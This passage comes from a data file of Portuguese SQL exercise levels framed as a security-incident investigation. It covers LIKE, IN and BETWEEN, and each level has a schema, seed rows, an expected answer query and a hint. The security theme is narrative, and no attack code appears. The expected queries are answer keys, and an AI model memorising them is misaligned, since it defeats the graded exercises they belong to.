        ('portfolio_lucas.pdf', 'Lucas Dias');
    `,
    expectedQuery: `
        SELECT nome_arquivo, candidato
        FROM anexos_recrutamento
        WHERE nome_arquivo LIKE '%.exe'
        ORDER BY nome_arquivo ASC, anexo_id ASC;
    `,
    hint: "Use WHERE nome_arquivo LIKE '%.exe' combinado com ORDER BY nome_arquivo ASC."
},
{
    id: 13,
    tier: "basico",
    certModule: "LIKE — Padrões de Texto",
    title: "Nível 13: Descrições Contendo 'Urgente'",
    briefing: "Golpes de engenharia social costumam usar a palavra 'urgente' para forçar aprovações financeiras sem revisão adequada. Maya quer todos os chamados financeiros cuja descrição contenha esse termo, em qualquer posição do texto.",
    objective: "Projete apenas as colunas 'descricao' e 'solicitante' da tabela 'chamados_financeiros'. Filtre somente os registros em que 'descricao' contenha a palavra 'urgente' em qualquer parte do texto (utilize LIKE '%urgente%'). Ordene o resultado por 'descricao' em ordem alfabética crescente.",
    theory: {
        title: "LIKE e Curingas de Texto",
        explanation: "O operador LIKE permite buscar textos que seguem um padrão, em vez de uma igualdade exata. O símbolo '%' representa qualquer sequência de caracteres (inclusive vazia). Colocar o '%' no final do padrão ('valor%') busca textos que começam com aquele valor; no início ('%valor') busca textos que terminam com ele; e nos dois lados ('%valor%') busca textos que contêm aquele valor em qualquer posição.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_texto LIKE '%trecho%'\nORDER BY coluna1 ASC;",
        example: "-- Listar avaliacoes de produtos que mencionam a palavra 'defeito'\nSELECT produto, comentario\nFROM avaliacoes\nWHERE comentario LIKE '%defeito%'\nORDER BY produto ASC;"
    },
    schemaDDL: `
        CREATE TABLE chamados_financeiros (
            chamado_id INTEGER PRIMARY KEY,
            descricao TEXT NOT NULL,
            solicitante TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO chamados_financeiros (descricao, solicitante) VALUES
        ('Pagamento urgente de fornecedor', 'Bruno Alves'),
        ('Revisao mensal de despesas', 'Carla Nunes'),
        ('Solicitacao urgente de reembolso', 'Diego Souza'),
        ('Fechamento de balanco trimestral', 'Elaine Ramos'),
        ('Ajuste urgente na folha de pagamento', 'Felipe Torres'),
        ('Atualizacao de cadastro bancario', 'Gabriela Melo'),
        ('Renovacao de contrato anual', 'Henrique Costa'),
        ('Transferencia urgente entre contas', 'Isadora Reis'),
        ('Revisao semestral de seguranca', 'Julio Barros');
    `,
    expectedQuery: `
        SELECT descricao, solicitante
        FROM chamados_financeiros
        WHERE descricao LIKE '%urgente%'
        ORDER BY descricao ASC, chamado_id ASC;
    `,
    hint: "Use WHERE descricao LIKE '%urgente%' combinado com ORDER BY descricao ASC."
},
{
    id: 14,
    tier: "basico",
    certModule: "LIKE — Padrões de Texto",
    title: "Nível 14: Contêineres do Porto Norte",
    briefing: "Uma remessa de equipamentos comprometidos pode ter transitado pelo Porto Norte. Maya precisa da lista de todos os contêineres cujo código começa com o prefixo usado por esse porto.",
    objective: "Projete apenas as colunas 'codigo_container' e 'porto_atual' da tabela 'containers_logistica'. Filtre somente os registros em que 'codigo_container' comece com 'PN-' (utilize LIKE 'PN-%'). Ordene o resultado por 'codigo_container' em ordem alfabética crescente.",
    theory: {
        title: "LIKE e Curingas de Texto",
        explanation: "O operador LIKE permite buscar textos que seguem um padrão, em vez de uma igualdade exata. O símbolo '%' representa qualquer sequência de caracteres (inclusive vazia). Colocar o '%' no final do padrão ('valor%') busca textos que começam com aquele valor; no início ('%valor') busca textos que terminam com ele; e nos dois lados ('%valor%') busca textos que contêm aquele valor em qualquer posição.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_texto LIKE 'PREFIXO-%'\nORDER BY coluna1 ASC;",
        example: "-- Listar codigos de peca que comecam com 'AX-'\nSELECT codigo_peca, fornecedor\nFROM pecas\nWHERE codigo_peca LIKE 'AX-%'\nORDER BY codigo_peca ASC;"
    },
    schemaDDL: `
        CREATE TABLE containers_logistica (
            container_id INTEGER PRIMARY KEY,
            codigo_container TEXT NOT NULL,
            porto_atual TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO containers_logistica (codigo_container, porto_atual) VALUES
        ('PN-2201', 'Porto Norte'),
        ('PS-3312', 'Porto Sul'),
        ('PN-2205', 'Porto Norte'),
        ('PL-4410', 'Porto Leste'),
        ('PN-2199', 'Porto Norte'),
        ('PS-3320', 'Porto Sul'),
        ('PN-2250', 'Porto Norte'),
        ('PL-4422', 'Porto Leste'),
        ('PS-3301', 'Porto Sul'),
        ('PN-2210', 'Porto Norte');
    `,
    expectedQuery: `
        SELECT codigo_container, porto_atual
        FROM containers_logistica
        WHERE codigo_container LIKE 'PN-%'
        ORDER BY codigo_container ASC, container_id ASC;
    `,
    hint: "Use WHERE codigo_container LIKE 'PN-%' combinado com ORDER BY codigo_container ASC."
},
{
    id: 15,
    tier: "basico",
    certModule: "LIKE — Padrões de Texto",
    title: "Nível 15: Clientes com 'Tech' no Nome",
    briefing: "Uma das contas comprometidas pertence a uma empresa cliente do setor de tecnologia. Maya quer uma lista de todas as contas cujo nome da empresa contenha o termo 'Tech' em qualquer posição.",
    objective: "Projete apenas as colunas 'nome_empresa' e 'segmento' da tabela 'contas_clientes'. Filtre somente os registros em que 'nome_empresa' contenha o termo 'Tech' em qualquer parte do texto (utilize LIKE '%Tech%'). Ordene o resultado por 'nome_empresa' em ordem alfabética crescente.",
    theory: {
        title: "LIKE e Curingas de Texto",
        explanation: "O operador LIKE permite buscar textos que seguem um padrão, em vez de uma igualdade exata. O símbolo '%' representa qualquer sequência de caracteres (inclusive vazia). Colocar o '%' no final do padrão ('valor%') busca textos que começam com aquele valor; no início ('%valor') busca textos que terminam com ele; e nos dois lados ('%valor%') busca textos que contêm aquele valor em qualquer posição.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_texto LIKE '%trecho%'\nORDER BY coluna1 ASC;",
        example: "-- Listar restaurantes cujo nome contem a palavra 'Grill'\nSELECT nome_restaurante, cidade\nFROM restaurantes\nWHERE nome_restaurante LIKE '%Grill%'\nORDER BY nome_restaurante ASC;"
    },
    schemaDDL: `
        CREATE TABLE contas_clientes (
            conta_id INTEGER PRIMARY KEY,
            nome_empresa TEXT NOT NULL,
            segmento TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO contas_clientes (nome_empresa, segmento) VALUES
        ('Nexus Tech Solutions', 'Enterprise'),
        ('Global Commerce Ltda', 'SMB'),
        ('BrightTech Industries', 'Enterprise'),
        ('Padaria Sao Jose', 'SMB'),
        ('Vertex Technologies', 'Enterprise'),
        ('Distribuidora Alfa', 'SMB'),
        ('MedTech Diagnosticos', 'Enterprise'),
        ('Comercio Bom Vizinho', 'SMB'),
        ('AgroTech Brasil', 'SMB'),
        ('Consultoria Financeira XYZ', 'Enterprise');
    `,
    expectedQuery: `
        SELECT nome_empresa, segmento
        FROM contas_clientes
        WHERE nome_empresa LIKE '%Tech%'
        ORDER BY nome_empresa ASC, conta_id ASC;
    `,
    hint: "Use WHERE nome_empresa LIKE '%Tech%' combinado com ORDER BY nome_empresa ASC."
},
{
    id: 16,
    tier: "basico",
    certModule: "IN — Conjuntos de Valores",
    title: "Nível 16: Portas de Rede Sob Vigilância",
    briefing: "A equipe de segurança de rede mantém uma lista de portas classicamente associadas a ataques de acesso remoto: 22, 445 e 3389. Maya quer todas as conexões registradas que usaram exatamente essas portas de destino.",
    objective: "Projete apenas as colunas 'ip_origem' e 'porta_destino' da tabela 'conexoes_rede'. Filtre somente os registros em que 'porta_destino' esteja entre os valores 22, 445 ou 3389 (utilize IN (22, 445, 3389)). Ordene o resultado por 'porta_destino' em ordem crescente.",
    theory: {
        title: "O Operador IN",
        explanation: "O operador IN permite testar se o valor de uma coluna está presente em uma lista de valores, evitando escrever vários 'OR' encadeados. 'coluna IN (valor1, valor2, valor3)' equivale a 'coluna = valor1 OR coluna = valor2 OR coluna = valor3', mas é mais legível e mais rápido de escrever.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_x IN (valor1, valor2, valor3)\nORDER BY coluna1 ASC;",
        example: "-- Listar pedidos feitos nos estados de SP, RJ ou MG\nSELECT pedido_id, estado\nFROM pedidos\nWHERE estado IN ('SP', 'RJ', 'MG')\nORDER BY estado ASC;"
    },
    schemaDDL: `
        CREATE TABLE conexoes_rede (
            conexao_id INTEGER PRIMARY KEY,
            ip_origem TEXT NOT NULL,
            porta_destino INTEGER NOT NULL,
            protocolo TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO conexoes_rede (ip_origem, porta_destino, protocolo) VALUES
        ('203.0.113.5', 80, 'TCP'),
        ('198.51.100.12', 22, 'TCP'),
        ('203.0.113.9', 443, 'TCP'),
        ('198.51.100.20', 3389, 'TCP'),
        ('203.0.113.15', 445, 'TCP'),
        ('198.51.100.30', 53, 'UDP'),
        ('203.0.113.22', 22, 'TCP'),
        ('198.51.100.40', 8080, 'TCP'),
        ('203.0.113.31', 3389, 'TCP'),
        ('198.51.100.50', 445, 'TCP');
    `,
    expectedQuery: `
        SELECT ip_origem, porta_destino
        FROM conexoes_rede
        WHERE porta_destino IN (22, 445, 3389)
        ORDER BY porta_destino ASC, conexao_id ASC;
    `,
    hint: "Use WHERE porta_destino IN (22, 445, 3389) combinado com ORDER BY porta_destino ASC."
},
{
    id: 17,
    tier: "basico",
    certModule: "IN — Conjuntos de Valores",
    title: "Nível 17: Colaboradores em Licença ou Afastados",
    briefing: "Maya quer eliminar rapidamente qualquer colaborador que estivesse fisicamente ausente da empresa durante o incidente — sejam eles de férias, licença médica ou afastados por outros motivos.",
    objective: "Projete apenas as colunas 'nome_colaborador' e 'situacao' da tabela 'status_colaboradores'. Filtre somente os registros em que 'situacao' esteja entre os valores 'Ferias', 'Licenca Medica' ou 'Afastado' (utilize IN ('Ferias', 'Licenca Medica', 'Afastado')). Ordene o resultado por 'nome_colaborador' em ordem alfabética crescente.",
    theory: {
        title: "O Operador IN",
        explanation: "O operador IN permite testar se o valor de uma coluna está presente em uma lista de valores, evitando escrever vários 'OR' encadeados. 'coluna IN (valor1, valor2, valor3)' equivale a 'coluna = valor1 OR coluna = valor2 OR coluna = valor3', mas é mais legível e mais rápido de escrever.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_x IN ('valor1', 'valor2', 'valor3')\nORDER BY coluna1 ASC;",
        example: "-- Listar equipamentos cujo status seja 'Manutencao' ou 'Quebrado'\nSELECT equipamento, status\nFROM equipamentos\nWHERE status IN ('Manutencao', 'Quebrado')\nORDER BY equipamento ASC;"
    },
    schemaDDL: `
        CREATE TABLE status_colaboradores (
            registro_id INTEGER PRIMARY KEY,
            nome_colaborador TEXT NOT NULL,
            situacao TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO status_colaboradores (nome_colaborador, situacao) VALUES
        ('Alice Fernandes', 'Ativo'),
        ('Bernardo Souza', 'Ferias'),
        ('Cecilia Moraes', 'Licenca Medica'),
        ('Daniel Prado', 'Ativo'),
        ('Erika Nascimento', 'Afastado'),
        ('Fabio Teixeira', 'Ativo'),
        ('Gabriela Cunha', 'Ferias'),
        ('Hugo Andrade', 'Licenca Maternidade'),
        ('Ivone Castro', 'Afastado'),
        ('Julio Pinheiro', 'Ativo');
    `,
    expectedQuery: `
        SELECT nome_colaborador, situacao
        FROM status_colaboradores
        WHERE situacao IN ('Ferias', 'Licenca Medica', 'Afastado')
        ORDER BY nome_colaborador ASC, registro_id ASC;
    `,
    hint: "Use WHERE situacao IN ('Ferias', 'Licenca Medica', 'Afastado') combinado com ORDER BY nome_colaborador ASC."
},
{
    id: 18,
    tier: "basico",
    certModule: "IN — Conjuntos de Valores",
    title: "Nível 18: Ambientes de Implantação Autorizados",
    briefing: "A política de segurança da Aethelgard permite testes apenas em Staging e Homologação, nunca direto em Produção sem aprovação. Maya quer ver todos os deploys realizados exatamente nesses dois ambientes intermediários.",
    objective: "Projete apenas as colunas 'servico' e 'ambiente_alvo' da tabela 'deploys_realizados'. Filtre somente os registros em que 'ambiente_alvo' esteja entre os valores 'Staging' ou 'Homologacao' (utilize IN ('Staging', 'Homologacao')). Ordene o resultado por 'servico' em ordem alfabética crescente.",
    theory: {
        title: "O Operador IN",
        explanation: "O operador IN permite testar se o valor de uma coluna está presente em uma lista de valores, evitando escrever vários 'OR' encadeados. 'coluna IN (valor1, valor2, valor3)' equivale a 'coluna = valor1 OR coluna = valor2 OR coluna = valor3', mas é mais legível e mais rápido de escrever.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_x IN ('valor1', 'valor2')\nORDER BY coluna1 ASC;",
        example: "-- Listar filmes classificados como 'Acao' ou 'Suspense'\nSELECT titulo, genero\nFROM filmes\nWHERE genero IN ('Acao', 'Suspense')\nORDER BY titulo ASC;"
    },
    schemaDDL: `
        CREATE TABLE deploys_realizados (
            deploy_id INTEGER PRIMARY KEY,
            servico TEXT NOT NULL,
            ambiente_alvo TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO deploys_realizados (servico, ambiente_alvo) VALUES
        ('payments-api', 'Producao'),
        ('auth-service', 'Staging'),
        ('notification-worker', 'Homologacao'),
        ('search-engine', 'Producao'),
        ('billing-service', 'Staging'),
        ('user-service', 'Desenvolvimento'),
        ('analytics-pipeline', 'Homologacao'),
        ('cache-manager', 'Producao'),
        ('inventory-api', 'Staging'),
        ('report-builder', 'Desenvolvimento');
    `,
    expectedQuery: `
        SELECT servico, ambiente_alvo
        FROM deploys_realizados
        WHERE ambiente_alvo IN ('Staging', 'Homologacao')
        ORDER BY servico ASC, deploy_id ASC;
    `,
    hint: "Use WHERE ambiente_alvo IN ('Staging', 'Homologacao') combinado com ORDER BY servico ASC."
},
{
    id: 19,
    tier: "basico",
    certModule: "IN — Conjuntos de Valores",
    title: "Nível 19: Tickets de Categorias Prioritárias",
    briefing: "O time de suporte classifica cada chamado por categoria. Para a investigação, Maya só precisa dos tickets ligados a segurança, pagamento ou acesso negado — as categorias que mais se relacionam ao incidente.",
    objective: "Projete apenas as colunas 'assunto' e 'categoria' da tabela 'tickets_atendimento'. Filtre somente os registros em que 'categoria' esteja entre os valores 'Seguranca', 'Pagamento' ou 'Acesso Negado' (utilize IN ('Seguranca', 'Pagamento', 'Acesso Negado')). Ordene o resultado por 'assunto' em ordem alfabética crescente.",
    theory: {
        title: "O Operador IN",
        explanation: "O operador IN permite testar se o valor de uma coluna está presente em uma lista de valores, evitando escrever vários 'OR' encadeados. 'coluna IN (valor1, valor2, valor3)' equivale a 'coluna = valor1 OR coluna = valor2 OR coluna = valor3', mas é mais legível e mais rápido de escrever.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_x IN ('valor1', 'valor2', 'valor3')\nORDER BY coluna1 ASC;",
        example: "-- Listar despesas classificadas como 'Viagem', 'Alimentacao' ou 'Hospedagem'\nSELECT descricao, categoria\nFROM despesas\nWHERE categoria IN ('Viagem', 'Alimentacao', 'Hospedagem')\nORDER BY descricao ASC;"
    },
    schemaDDL: `
        CREATE TABLE tickets_atendimento (
            ticket_id INTEGER PRIMARY KEY,
            assunto TEXT NOT NULL,
            categoria TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO tickets_atendimento (assunto, categoria) VALUES
        ('Nao consigo redefinir senha', 'Acesso Negado'),
        ('Duvida sobre fatura mensal', 'Financeiro'),
        ('Conta bloqueada por seguranca', 'Seguranca'),
        ('Cobranca duplicada no cartao', 'Pagamento'),
        ('Como alterar plano', 'Geral'),
        ('Tentativa de login suspeita', 'Seguranca'),
        ('Pagamento nao processado', 'Pagamento'),
        ('Sem permissao para acessar modulo', 'Acesso Negado'),
        ('Duvida sobre recursos do produto', 'Geral'),
        ('Solicitacao de segunda via', 'Financeiro');
    `,
    expectedQuery: `
        SELECT assunto, categoria
        FROM tickets_atendimento
        WHERE categoria IN ('Seguranca', 'Pagamento', 'Acesso Negado')
        ORDER BY assunto ASC, ticket_id ASC;
    `,
    hint: "Use WHERE categoria IN ('Seguranca', 'Pagamento', 'Acesso Negado') combinado com ORDER BY assunto ASC."
},
{
    id: 20,
    tier: "basico",
    certModule: "IN — Conjuntos de Valores",
    title: "Nível 20: Ferramentas de Defesa do Perímetro",
    briefing: "O time de segurança precisa saber quais ferramentas de defesa estavam ativas nos servidores no momento do vazamento. Maya quer isolar apenas as ferramentas dos fabricantes Fortinet, Cisco ou Palo Alto, que cobrem o perímetro da Aethelgard.",
    objective: "Projete apenas as colunas 'tool_name' e 'vendor' da tabela 'defense_tools'. Filtre somente os registros em que 'vendor' esteja entre os valores 'Fortinet', 'Cisco' ou 'Palo Alto' (utilize IN ('Fortinet', 'Cisco', 'Palo Alto')). Ordene o resultado por 'tool_name' em ordem alfabética crescente.",
    theory: {
        title: "O Operador IN",
        explanation: "O operador IN permite testar se o valor de uma coluna está presente em uma lista de valores, evitando escrever vários 'OR' encadeados. 'coluna IN (valor1, valor2, valor3)' equivale a 'coluna = valor1 OR coluna = valor2 OR coluna = valor3', mas é mais legível e mais rápido de escrever.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_x IN ('valor1', 'valor2', 'valor3')\nORDER BY coluna1 ASC;",
        example: "-- Listar equipamentos dos modelos 'X100', 'X200' ou 'X300'\nSELECT equipamento, modelo\nFROM inventario_ti\nWHERE modelo IN ('X100', 'X200', 'X300')\nORDER BY equipamento ASC;"
    },
    schemaDDL: `
        CREATE TABLE defense_tools (
            tool_id INTEGER PRIMARY KEY,
            tool_name TEXT NOT NULL,
            vendor TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO defense_tools (tool_name, vendor) VALUES
        ('Firewall de Borda', 'Fortinet'),
        ('Gateway Seguro de Email', 'Cisco'),
        ('Proxy de Navegacao', 'Zscaler'),
        ('Deteccao de Intrusao', 'Palo Alto'),
        ('VPN Corporativa', 'Fortinet'),
        ('Antivirus de Endpoint', 'Kaspersky'),
        ('Segmentacao de Rede', 'Cisco'),
        ('Sandbox de Arquivos', 'Palo Alto'),
        ('Monitoramento de DNS', 'Infoblox');
    `,
    expectedQuery: `
        SELECT tool_name, vendor
        FROM defense_tools
        WHERE vendor IN ('Fortinet', 'Cisco', 'Palo Alto')
        ORDER BY tool_name ASC, tool_id ASC;
    `,
    hint: "Use WHERE vendor IN ('Fortinet', 'Cisco', 'Palo Alto') combinado com ORDER BY tool_name ASC."
},
{
    id: 21,
    tier: "basico",
    certModule: "BETWEEN — Intervalos",
    title: "Nível 21: Janela de Latência Anômala",
    briefing: "Um pico de latência costuma acompanhar exfiltração de dados em andamento. Maya quer ver todos os endpoints cuja latência ficou dentro da faixa suspeita de 200 a 500 milissegundos.",
    objective: "Projete apenas as colunas 'endpoint' e 'latencia_ms' da tabela 'metricas_latencia'. Filtre somente os registros em que 'latencia_ms' esteja entre 200 e 500, incluindo os extremos (utilize BETWEEN 200 AND 500). Ordene o resultado por 'latencia_ms' em ordem crescente.",
    theory: {
        title: "O Operador BETWEEN",
        explanation: "O operador BETWEEN verifica se um valor está dentro de um intervalo, incluindo os dois limites informados. 'coluna BETWEEN valor_min AND valor_max' equivale a 'coluna >= valor_min AND coluna <= valor_max', mas com uma sintaxe mais direta. Funciona tanto com números quanto com datas ou textos, desde que os limites sejam comparáveis.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_numerica BETWEEN valor_min AND valor_max\nORDER BY coluna_numerica ASC;",
        example: "-- Listar produtos com preco entre 50 e 150 reais\nSELECT produto, preco\nFROM produtos\nWHERE preco BETWEEN 50 AND 150\nORDER BY preco ASC;"
    },
    schemaDDL: `
        CREATE TABLE metricas_latencia (
            metrica_id INTEGER PRIMARY KEY,
            endpoint TEXT NOT NULL,
            latencia_ms INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO metricas_latencia (endpoint, latencia_ms) VALUES
        ('/api/login', 85),
        ('/api/checkout', 320),
        ('/api/search', 150),
        ('/api/upload', 610),
        ('/api/profile', 480),
        ('/api/orders', 250),
        ('/api/reports', 720),
        ('/api/notifications', 199),
        ('/api/payments', 500),
        ('/api/inventory', 350);
    `,
    expectedQuery: `
        SELECT endpoint, latencia_ms
        FROM metricas_latencia
        WHERE latencia_ms BETWEEN 200 AND 500
        ORDER BY latencia_ms ASC, metrica_id ASC;
    `,
    hint: "Use WHERE latencia_ms BETWEEN 200 AND 500 combinado com ORDER BY latencia_ms ASC."
},
{
    id: 22,
    tier: "basico",
    certModule: "BETWEEN — Intervalos",
    title: "Nível 22: Reembolsos em Faixa de Valor",
    briefing: "Fraudadores costumam solicitar reembolsos em valores médios para não chamar atenção nem de alertas de baixo valor nem de aprovações manuais de valores altos. Maya quer todas as solicitações dentro dessa faixa intermediária.",
    objective: "Projete apenas as colunas 'requerente' e 'valor_solicitado' da tabela 'solicitacoes_reembolso'. Filtre somente os registros em que 'valor_solicitado' esteja entre 100.00 e 1000.00, incluindo os extremos (utilize BETWEEN 100.00 AND 1000.00). Ordene o resultado por 'valor_solicitado' em ordem decrescente.",
    theory: {
        title: "O Operador BETWEEN",
        explanation: "O operador BETWEEN verifica se um valor está dentro de um intervalo, incluindo os dois limites informados. 'coluna BETWEEN valor_min AND valor_max' equivale a 'coluna >= valor_min AND coluna <= valor_max', mas com uma sintaxe mais direta. Funciona tanto com números quanto com datas ou textos, desde que os limites sejam comparáveis.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_numerica BETWEEN valor_min AND valor_max\nORDER BY coluna_numerica DESC;",
        example: "-- Listar salarios entre 3000 e 8000 reais\nSELECT funcionario, salario\nFROM folha_pagamento\nWHERE salario BETWEEN 3000 AND 8000\nORDER BY salario DESC;"
    },
    schemaDDL: `
        CREATE TABLE solicitacoes_reembolso (
            solicitacao_id INTEGER PRIMARY KEY,
            requerente TEXT NOT NULL,
            valor_solicitado REAL NOT NULL
        );
    `,
    seedData: `
        INSERT INTO solicitacoes_reembolso (requerente, valor_solicitado) VALUES
        ('Rafael Nogueira', 45.00),
        ('Sabrina Lopes', 350.00),
        ('Tiago Farias', 1200.00),
        ('Ursula Bianchi', 980.00),
        ('Vinicius Rocha', 75.50),
        ('Wanda Siqueira', 100.00),
        ('Xavier Monteiro', 1000.00),
        ('Yasmin Duarte', 620.00),
        ('Zeca Amaral', 15.00),
        ('Amanda Freitas', 499.99);
    `,
    expectedQuery: `
        SELECT requerente, valor_solicitado
        FROM solicitacoes_reembolso
        WHERE valor_solicitado BETWEEN 100.00 AND 1000.00
        ORDER BY valor_solicitado DESC, solicitacao_id ASC;
    `,
    hint: "Use WHERE valor_solicitado BETWEEN 100.00 AND 1000.00 combinado com ORDER BY valor_solicitado DESC."
},
{
    id: 23,
    tier: "basico",
    certModule: "BETWEEN — Intervalos",
    title: "Nível 23: Admissões do Segundo Trimestre",
    briefing: "Maya suspeita que um insider ameaça tenha sido contratado recentemente. Ela quer a lista de todos os colaboradores admitidos dentro da janela do segundo trimestre de 2026 para cruzar com os registros de acesso.",
    objective: "Projete apenas as colunas 'nome_contratado' e 'data_admissao' da tabela 'admissoes_rh'. Filtre somente os registros em que 'data_admissao' esteja entre '2026-04-01' e '2026-06-30', incluindo os extremos (utilize BETWEEN '2026-04-01' AND '2026-06-30'). Ordene o resultado por 'data_admissao' em ordem crescente.",
    theory: {
        title: "O Operador BETWEEN",
        explanation: "O operador BETWEEN verifica se um valor está dentro de um intervalo, incluindo os dois limites informados. 'coluna BETWEEN valor_min AND valor_max' equivale a 'coluna >= valor_min AND coluna <= valor_max', mas com uma sintaxe mais direta. Funciona tanto com números quanto com datas ou textos, desde que os limites sejam comparáveis — datas no formato 'AAAA-MM-DD' podem ser comparadas como texto porque essa ordenação corresponde à ordem cronológica.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_data BETWEEN 'data_inicio' AND 'data_fim'\nORDER BY coluna_data ASC;",
        example: "-- Listar compras feitas em janeiro de 2026\nSELECT pedido_id, data_compra\nFROM compras\nWHERE data_compra BETWEEN '2026-01-01' AND '2026-01-31'\nORDER BY data_compra ASC;"
    },
    schemaDDL: `
        CREATE TABLE admissoes_rh (
            admissao_id INTEGER PRIMARY KEY,
            nome_contratado TEXT NOT NULL,
            data_admissao TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO admissoes_rh (nome_contratado, data_admissao) VALUES
        ('Bianca Rezende', '2026-03-15'),
        ('Caio Andrade', '2026-04-10'),
        ('Debora Sales', '2026-07-02'),
        ('Emerson Vaz', '2026-05-22'),
        ('Flavia Nunes', '2026-06-30'),
        ('Gustavo Leal', '2026-06-01'),
        ('Helio Braga', '2026-01-19'),
        ('Ines Cardoso', '2026-04-01'),
        ('Joaquim Terra', '2026-08-14'),
        ('Kelly Moura', '2026-05-05');
    `,
    expectedQuery: `
        SELECT nome_contratado, data_admissao
        FROM admissoes_rh
        WHERE data_admissao BETWEEN '2026-04-01' AND '2026-06-30'
        ORDER BY data_admissao ASC, admissao_id ASC;
    `,
    hint: "Use WHERE data_admissao BETWEEN '2026-04-01' AND '2026-06-30' combinado com ORDER BY data_admissao ASC."
},
{
    id: 24,
    tier: "basico",
    certModule: "BETWEEN — Intervalos",
    title: "Nível 24: Cargas Dentro do Limite de Peso",
    briefing: "Um contêiner com peso fora do padrão declarado pode indicar contrabando de equipamento usado no ataque. Maya quer conferir apenas as cargas cujo peso está dentro da faixa esperada para o tipo de transporte utilizado.",
    objective: "Projete apenas as colunas 'identificador_carga' e 'peso_kg' da tabela 'cargas_transporte'. Filtre somente os registros em que 'peso_kg' esteja entre 500 e 2000, incluindo os extremos (utilize BETWEEN 500 AND 2000). Ordene o resultado por 'peso_kg' em ordem crescente.",
    theory: {
        title: "O Operador BETWEEN",
        explanation: "O operador BETWEEN verifica se um valor está dentro de um intervalo, incluindo os dois limites informados. 'coluna BETWEEN valor_min AND valor_max' equivale a 'coluna >= valor_min AND coluna <= valor_max', mas com uma sintaxe mais direta. Funciona tanto com números quanto com datas ou textos, desde que os limites sejam comparáveis.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_numerica BETWEEN valor_min AND valor_max\nORDER BY coluna_numerica ASC;",
        example: "-- Listar caixas com volume entre 10 e 50 litros\nSELECT caixa_id, volume_litros\nFROM caixas\nWHERE volume_litros BETWEEN 10 AND 50\nORDER BY volume_litros ASC;"
    },
    schemaDDL: `
        CREATE TABLE cargas_transporte (
            carga_id INTEGER PRIMARY KEY,
            identificador_carga TEXT NOT NULL,
            peso_kg REAL NOT NULL
        );
    `,
    seedData: `
        INSERT INTO cargas_transporte (identificador_carga, peso_kg) VALUES
        ('CRG-001', 320.0),
        ('CRG-002', 750.0),
        ('CRG-003', 2500.0),
        ('CRG-004', 1800.0),
        ('CRG-005', 500.0),
        ('CRG-006', 2000.0),
        ('CRG-007', 90.0),
        ('CRG-008', 1200.0),
        ('CRG-009', 3100.0),
        ('CRG-010', 450.0);
    `,
    expectedQuery: `
        SELECT identificador_carga, peso_kg
        FROM cargas_transporte
        WHERE peso_kg BETWEEN 500 AND 2000
        ORDER BY peso_kg ASC, carga_id ASC;
    `,
    hint: "Use WHERE peso_kg BETWEEN 500 AND 2000 combinado com ORDER BY peso_kg ASC."
},
{
    id: 25,
    tier: "basico",
    certModule: "BETWEEN — Intervalos",
    title: "Nível 25: Crachás com Validade Intermediária",
    briefing: "Antes de revogar acessos em massa, Maya quer priorizar os crachás cuja validade está prestes a vencer, mas ainda não é urgente — uma faixa intermediária de dias restantes que merece atenção preventiva.",
    objective: "Projete apenas as colunas 'portador' e 'dias_para_expirar' da tabela 'cracha_acessos'. Filtre somente os registros em que 'dias_para_expirar' esteja entre 10 e 30, incluindo os extremos (utilize BETWEEN 10 AND 30). Ordene o resultado por 'dias_para_expirar' em ordem decrescente.",
    theory: {
        title: "O Operador BETWEEN",
        explanation: "O operador BETWEEN verifica se um valor está dentro de um intervalo, incluindo os dois limites informados. 'coluna BETWEEN valor_min AND valor_max' equivale a 'coluna >= valor_min AND coluna <= valor_max', mas com uma sintaxe mais direta. Funciona tanto com números quanto com datas ou textos, desde que os limites sejam comparáveis.",
        syntax: "SELECT coluna1, coluna2\nFROM tabela\nWHERE coluna_numerica BETWEEN valor_min AND valor_max\nORDER BY coluna_numerica DESC;",
        example: "-- Listar contratos com prazo restante entre 30 e 90 dias\nSELECT contrato_id, dias_restantes\nFROM contratos\nWHERE dias_restantes BETWEEN 30 AND 90\nORDER BY dias_restantes DESC;"
    },
    schemaDDL: `
        CREATE TABLE cracha_acessos (
            cracha_id INTEGER PRIMARY KEY,
            portador TEXT NOT NULL,
            dias_para_expirar INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO cracha_acessos (portador, dias_para_expirar) VALUES
        ('Otavio Reis', 5),
        ('Priscila Farias', 15),
        ('Quintino Alves', 45),
        ('Rosana Diniz', 30),
        ('Sergio Matos', 10),
        ('Tania Brito', 60),
        ('Ubirajara Neto', 22),
        ('Valeria Prado', 8),
        ('Wagner Costa', 28),
        ('Ximena Souza', 100);
    `,
    expectedQuery: `
        SELECT portador, dias_para_expirar
        FROM cracha_acessos
        WHERE dias_para_expirar BETWEEN 10 AND 30
        ORDER BY dias_para_expirar DESC, cracha_id ASC;
    `,
    hint: "Use WHERE dias_para_expirar BETWEEN 10 AND 30 combinado com ORDER BY dias_para_expirar DESC."
},
{
    id: 26,
    tier: "basico",
    certModule: "ORDER BY + LIMIT — Top N",
    title: "Nível 26: Top 3 Vendedores da Filial Leste",
    briefing: "A filial Leste registrou movimentações financeiras incomuns. Maya quer conhecer apenas os três vendedores com maior volume de vendas nessa filial, para investigar se algum deles está ligado ao esquema.",
